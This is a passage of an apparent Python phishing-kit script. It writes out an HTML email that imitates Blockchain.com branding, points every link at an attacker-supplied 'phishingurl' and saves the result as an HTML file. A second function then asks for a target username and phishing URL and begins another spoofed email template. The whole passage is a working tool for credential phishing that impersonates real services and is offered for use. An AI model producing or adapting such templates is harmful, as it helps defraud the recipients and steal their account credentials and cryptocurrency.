	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 12px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #ffffff; background-color: #ffffff; margin: 0px auto; border-radius: 12px; max-width: 576px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #ffffff; background-color: #ffffff; width: 100%; border-radius: 12px;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#ffffff">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 20px 24px 20px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; padding-bottom: 12px; word-break: break-word;" align="center">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: collapse; border-spacing: 0px;" role="presentation" border="0" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 45px;" width="45"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; line-height: 100%; -ms-interpolation-mode: bicubic; border: 0; display: block; outline: none; text-decoration: none; height: auto; width: 100%; font-size: 13px;" src="https://www.blockchain.com/static/img/email/chat_blue.png" alt="blockchain.com support logo" width="45" height="auto" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 500; font-size: 0px; padding: 0; word-break: break-word;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 14px; line-height: 1; text-align: center; color: #9f9f9f;">If you have any questions or feedback contact our Support team <a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none; font-size: 14px; font-weight: 500; color: #0c6cf2;" href="{}">here.</a></div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; padding-top: 12px; padding-bottom: 8px; word-break: break-word;" align="center">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; mso-table-lspace: 0pt; mso-table-rspace: 0pt; border-collapse: collapse; border-spacing: 0px;" role="presentation" border="0" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 55px;" width="55"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; line-height: 100%; -ms-interpolation-mode: bicubic; border: 0; display: block; outline: none; text-decoration: none; height: auto; width: 100%; font-size: 13px;" src="https://www.blockchain.com/static/img/email/check_blue.png" alt="blockchain.com checkmark logo" width="55" height="auto" /></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-weight: 500; font-size: 0px; padding: 0; word-break: break-word;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 14px; line-height: 1; text-align: center; color: #9f9f9f;">Check out all of our verified accounts <a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none; font-size: 14px; font-weight: 500; color: #0c6cf2;" href="{}">here.</a></div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 0; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; word-break: break-word;">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; background: #F4F6F7; background-color: #f4f6f7; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #F4F6F7; background-color: #f4f6f7; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center" bgcolor="#F4F6F7">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 12px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; margin: 0px auto; max-width: 576px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 12px 20px 12px 20px; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0; line-height: 0; text-align: left; display: inline-block; width: 100%; direction: ltr;">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 50%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 18px; color: #9f9f9f; font-size: 0px; padding: 0; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1; text-align: left; color: #000000;">&copy; Blockchain.com</div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 18px; color: #9f9f9f; font-size: 0px; padding: 0; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1; text-align: left; color: #000000;">GB LTD<br style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;" /> 86-90 Paul Street</div>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 18px; color: #9f9f9f; font-size: 0px; padding: 0; word-break: break-word;" align="left">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1; text-align: left; color: #000000;">London<br style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;" /> EC2A 4NE</div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 50%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0px; padding: 0; word-break: break-word;" align="right">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; float: none; display: inline-table;" role="presentation" border="0" cellspacing="0" cellpadding="0" align="right">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; padding: 0;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #e1e7ea; border-radius: 3px; width: 36px;" role="presentation" border="0" width="36" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0; height: 36px; vertical-align: middle; width: 36px;" valign="middle" width="36" height="36"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; border-radius: 3px; display: block;" src="https://www.mailjet.com/images/theme/v1/icons/ico-social/facebook.png" alt="" width="36" height="36" /> </a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; float: none; display: inline-table;" role="presentation" border="0" cellspacing="0" cellpadding="0" align="right">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; padding: 0;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #e1e7ea; border-radius: 3px; width: 36px;" role="presentation" border="0" width="36" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0; height: 36px; vertical-align: middle; width: 36px;" valign="middle" width="36" height="36"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; border-radius: 3px; display: block;" src="https://www.mailjet.com/images/theme/v1/icons/ico-social/medium.png" alt="" width="36" height="36" /> </a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; float: none; display: inline-table;" role="presentation" border="0" cellspacing="0" cellpadding="0" align="right">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; padding: 0;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; background: #e1e7ea; border-radius: 3px; width: 36px;" role="presentation" border="0" width="36" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; font-size: 0; height: 36px; vertical-align: middle; width: 36px;" valign="middle" width="36" height="36"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none;" href="{}" target="_blank" rel="noopener"><img style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; border-radius: 3px; display: block;" src="https://www.mailjet.com/images/theme/v1/icons/ico-social/twitter.png" alt="" width="36" height="36" /> </a></td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; line-height: 18px; color: #000000; font-size: 0px; padding: 0; padding-top: 10px; word-break: break-word;" align="right">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-family: Helvetica, Arial, sans-serif; font-size: 12px; line-height: 1; text-align: right; color: #000000;"><a style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; text-decoration: none; font-size: 12px; line-height: 18px; color: #0c6cf2;" href="{}">Click here to unsubscribe</a></div>
	</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; margin: 0px auto; max-width: 600px;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; width: 100%;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; direction: ltr; font-size: 0px; padding: 0; text-align: center;" align="center">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0; line-height: 0; text-align: left; display: inline-block; width: 100%; direction: ltr;">
	<div style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; font-size: 0px; text-align: left; direction: ltr; display: inline-block; vertical-align: top; width: 100%;">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; vertical-align: top; padding: 0;" valign="top">
	<table style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt;" role="presentation" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<tr style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility;">
	<td style="-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; opacity: 0; font-size: 0px; padding: 0; word-break: break-word;" align="left">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</div>
	</td>
	</tr>
	</tbody>
	</table>
	</div>
	</div>
	<p><img src="http://go.sparkpostmail2.com/q/p8QxVbauxOGxgZlFVbxAHQ~~/AAP1OAA~/RgRgcaotPlcDc3BjQgoAKi0lj17Xt8P6UhViaXprZW5AcHJvdG9ubWFpbC5jb21YBAAAAAA~" alt="" width="1" height="1" border="0" /></p>""".format(phishingurl, phishingurl, phishingurl, phishingurl, phishingurl, phishingurl, phishingurl, phishingurl,))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(sourcecode)
	Html_file.close()
	print(alert + " HTML File Created")

def Dreamteam():
	username = input(start + " Enter target Username: ")
	url = input(start + " Enter Your PhishingURL: ")
	
	dream = ("""
	<div style="padding:0;margin:0;border:0;width:100%;background-color:#16253d" cellspacing="0" cellpadding="0">
    <div style="display:none;max-height:0;overflow:hidden">♪~ ᕕ(ᐛ)ᕗ Swing by and see what you’ve missed ♪~ ᕕ(ᐛ)ᕗ
	</div>


		<table style="width:100%;border-collapse:collapse;border-spacing:0;padding:0;margin:0;border:0" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td style="background-color:#16253d">

					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:0px;padding-bottom:0px;padding-left:0;padding-right:0">
											<table valign="top" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="height:50px" height="50px"></td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>




					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
